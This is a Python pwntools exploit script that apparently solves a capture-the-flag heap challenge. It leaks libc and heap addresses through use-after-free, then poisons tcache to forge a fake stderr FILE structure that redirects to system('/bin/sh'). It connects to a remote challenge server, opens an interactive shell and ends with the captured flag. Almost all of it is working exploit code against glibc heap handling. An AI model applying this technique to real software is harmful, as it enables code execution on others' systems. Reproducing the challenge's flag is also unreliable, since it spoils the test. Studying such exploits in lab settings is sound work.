# Cre: vietnq

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./pwn5_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

if args.LOCAL:
    p = process([exe.path])
else:
    p = remote("103.197.184.48", 13339)

def choice(opt):
    p.sendlineafter(b'>> ', str(opt))
def add(idx, size, data = b'1'*8):
    choice(1)
    p.sendlineafter(b': ', str(idx))
    p.sendlineafter(b': ', str(size))
    p.sendafter(b': ', data)
def show(idx):
    choice(2)
    p.sendlineafter(b': ', str(idx))
def delete(idx):
    choice(3)
    p.sendlineafter(b': ', str(idx))

add(0, 0x420)
add(1, 0x420)
for i in range(7):
    add(i + 2, 0x100)
delete(1)
delete(0)
show(0)
p.recvuntil(b':\n')
libc_base = u64(p.recvuntil(b'\n')[:-1].ljust(8,b'\0')) - 0x21ace0
stderr = libc_base + libc.sym['_IO_2_1_stderr_']
_IO_wfile_jumps = libc_base + libc.sym['_IO_wfile_jumps']
system = libc_base + libc.sym['system']
bin_sh = libc_base + 0x1d8678
print("libc_base : " + hex(libc_base))
print("stderr : " + hex(stderr))
gdb.attach(p)

delete(2)
show(2)
p.recvuntil(b':\n')
heap_base = u64(p.recvuntil(b'\n')[:-1].ljust(8,b'\0')) << 12
print("heap_base : " + hex(heap_base))
payload = b'\0'*0x428 + p64(0x111) + p64(0)*4
add(0, 0x500, payload)
delete(1)

delete(0)
fake_io_adr = heap_base + 0x2a0 
payload = b'\0'*0x428 + p64(0x111) + p64((heap_base + 0x6d0) >> 12 ^ (stderr))
add(0, 0x500, payload)


add(1, 0x100,b'\0'*0x10)
flag = b'  /bin/sh;'
payload = (flag)
payload = payload.ljust(0x20, b'\0') + p64(0) #_IO_write_base
payload += p64(1) #_IO_write_ptr
payload = payload.ljust(0x88, b'\0') + p64(fake_io_adr - 0x100) #lock
payload = payload.ljust(0xa0, b'\0') + p64(fake_io_adr) #wide_data
payload = payload.ljust(0xd8, b'\0') + p64(_IO_wfile_jumps - 0x20) #vtable
add(9, 0x100, (payload)) #stderr

delete(3)
delete(0)
delete(1)
payload = b''
payload = payload.ljust(0x18, b'\0') + p64(0) #wide_data -> _IO_write_ptr
payload = payload.ljust(0x30, b'\0') + p64(0) #wide_data -> _IO_buf_base
payload = payload.ljust(0xe0, b'\0') + p64(fake_io_adr + 0x100) #wide_data -> vtable
payload = payload.ljust(0x100,b'\0') #fake_vtable_addr
payload = payload.ljust(0x100 + 0x68, b'\0') + p64(system) #vtable -> _IO_wfile_overflow
payload = payload.ljust(0x428,b'\0') + p64(0x110) + p64((heap_base + 0x6d0) >> 12 ^ (heap_base + 0x1250))
add(0, 0x500, payload)
add(1, 0x100, b'\0'*0x10)
add(10, 0x100, b'\0'*0x18 + p64(0x120)) #size_top_chunk

choice(1)
p.sendlineafter(b': ', str(11))
p.sendlineafter(b': ', str(0x500))
p.sendline(b'echo hacked by vietnq!')
p.interactive()
#PTITCTF{OcToBeR_19,2024_WaS_a_wOnDeRfUl_mEmOrY_fOr_tHe_CeLeBi_TeAm.}
```
